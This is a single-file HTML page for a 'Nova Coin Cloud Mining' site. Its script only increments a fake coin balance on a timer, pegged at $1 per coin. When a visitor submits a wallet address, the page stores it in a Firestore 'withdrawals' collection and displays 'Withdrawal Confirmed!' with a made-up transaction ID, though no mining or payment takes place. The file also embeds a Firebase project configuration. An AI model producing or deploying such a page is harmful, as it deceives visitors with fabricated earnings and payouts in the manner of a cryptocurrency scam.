<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Nova Coin Cloud Mining</title>
    <style>
        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; text-align: center; padding: 40px; background: #0b0b0b; color: white; }
        .card { max-width: 450px; margin: auto; background: #151515; padding: 30px; border-radius: 30px; border: 1px solid #f39c12; box-shadow: 0 0 30px rgba(243, 156, 18, 0.25); }
        h1 { font-size: 32px; margin-bottom: 5px; }
        .rate { color: #f39c12; font-weight: bold; margin-bottom: 20px; font-size: 18px; }
        #counter { font-size: 64px; color: #ffffff; font-weight: bold; margin: 15px 0; font-family: 'Courier New', Courier, monospace; letter-spacing: 2px; }
        #usd-value { font-size: 28px; color: #2ecc71; margin-bottom: 30px; font-weight: bold; }
        input { padding: 18px; width: 88%; margin-top: 10px; border-radius: 12px; border: 1px solid #333; background: #000; color: #fff; text-align: center; font-size: 16px; outline: none; transition: 0.3s; }
        input:focus { border-color: #f39c12; box-shadow: 0 0 10px rgba(243, 156, 18, 0.3); }
        button { padding: 20px; width: 100%; background: linear-gradient(45deg, #f39c12, #e67e22); color: white; border: none; border-radius: 12px; cursor: pointer; font-weight: bold; margin-top: 25px; font-size: 20px; transition: 0.3s; box-shadow: 0 5px 15px rgba(0,0,0,0.3); }
        button:hover { transform: translateY(-3px); box-shadow: 0 8px 20px rgba(243, 156, 18, 0.4); }
        button:disabled { background: #444; cursor: not-allowed; transform: none; box-shadow: none; }
        #status { margin-top: 20px; font-size: 16px; min-height: 50px; line-height: 1.6; }
        .success-msg { color: #2ecc71; font-weight: bold; animation: fadeIn 0.5s; }
        @keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }
    </style>
</head>
<body>

<div class="card">
    <h1>Nova Coin Cloud Mining</h1>
    <div class="rate">1 NOVA = $1.00 USD</div>
    <div id="counter">0.0000</div>
    <div id="usd-value">≈ $0.00</div>
    <input type="text" id="wallet-address" placeholder="Enter Wallet Address">
    <button id="withdraw-btn">Withdraw to Wallet</button>
    <div id="status"></div>
</div>

<script type="module">
    import { initializeApp } from "https://www.gstatic.com/firebasejs/9.23.0/firebase-app.js";
    import { getFirestore, collection, addDoc, serverTimestamp } from "https://www.gstatic.com/firebasejs/9.23.0/firebase-firestore.js";

    // إعدادات الـ Config التي نسختها لمشروع pay-coins
    const firebaseConfig = {
      apiKey: "AIzaSyCDIizIvd_7nUT6B4sGIc_s-CnZ5hQECCg",
      authDomain: "pay-coins.firebaseapp.com",
      projectId: "pay-coins",
      storageBucket: "pay-coins.firebasestorage.app",
      messagingSenderId: "279908586614",
      appId: "1:279908586614:web:632ce326f8b3a0e0e47b57",
      measurementId: "G-SG3W4FH9DC"
    };

    const app = initializeApp(firebaseConfig);
    const db = getFirestore(app);

    let balance = 0.0000;
    let miningActive = true;
    const counterDisplay = document.getElementById('counter');
    const usdDisplay = document.getElementById('usd-value');
    const btn = document.getElementById('withdraw-btn');
    const statusDiv = document.getElementById('status');
    const addressInput = document.getElementById('wallet-address');
    
    // عداد التعدين الأصلي
    const miningInterval = setInterval(() => {
        if (miningActive) {
            balance += 0.0007; 
            counterDisplay.innerText = balance.toFixed(4);
            usdDisplay.innerText = "≈ $" + balance.toFixed(2);
        }
    }, 100);

    // عملية السحب الأصلية لإظهار علامة النجاح ✅
    btn.addEventListener('click', async () => {
        const walletAddress = addressInput.value.trim();
        
        if (!walletAddress) {
            alert("Please enter a valid wallet address!");
            return;
        }

        miningActive = false; 
        const amountToWithdraw = counterDisplay.innerText;
        btn.innerText = "Processing..."; // الحالة التي يظهر فيها الزر أثناء العمل
        btn.disabled = true;

        try {
            // إرسال البيانات لمجموعة withdrawals
            const docRef = await addDoc(collection(db, "withdrawals"), {
                address: walletAddress,
                amount: amountToWithdraw,
                status: "Pending",
                timestamp: serverTimestamp()
            });

            // العودة لعلامة ✅ وتصفير العداد
            btn.innerText = "✅ Success!";
            statusDiv.innerHTML = "<div class='success-msg'>Withdrawal Confirmed!<br>Transaction ID: " + docRef.id + "</div>";
            
            balance = 0;
            counterDisplay.innerText = "0.0000";
            usdDisplay.innerText = "≈ $0.00";
            addressInput.value = "";

        } catch (error) {
            console.error("Error:", error);
            btn.innerText = "Error - Try Again";
            btn.disabled = false;
            miningActive = true;
            statusDiv.style.color = "#ff4d4d";
            statusDiv.innerText = "Check connection or Firebase Database Rules.";
        }
    });
</script>
</body>
</html>
